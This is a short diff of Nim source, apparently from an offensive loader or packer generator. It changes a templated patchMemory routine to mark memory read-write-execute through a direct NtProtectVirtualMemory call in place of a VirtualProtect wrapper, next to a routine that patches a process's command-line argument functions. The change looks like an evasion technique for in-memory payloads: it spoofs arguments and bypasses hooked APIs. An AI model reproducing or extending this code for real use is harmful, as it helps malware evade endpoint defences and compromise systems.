@@ -484,11 +484,13 @@ let encodedenvkey = encode(envkey)
 let PatchargsFuncs = fmt"""
 var arguments: string = "{arguments}"
 when defined(args):
-    proc patchMemory*(targetAddr: pointer, data: openArray[byte]): void =
-        var oldProtect: DWORD
-        success =  MyVirtualProtect(targetAddr, cast[SIZE_T](len(data)), PAGE_READWRITE, cast[PDWORD](addr(oldProtect)))
+    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+        var oldProtect: DWORD = 0
+        var lpAddress = targetAddr
+        var dwSize = cast[SIZE_T](len(data))
+        success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
         copyMem(targetAddr, unsafeAddr data[0], len(data))
-        success = MyVirtualProtect(targetAddr, cast[SIZE_T](len(data)), oldProtect, cast[PDWORD](addr(oldProtect)))
+        success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
 when defined(args):
     proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
         when defined x86:
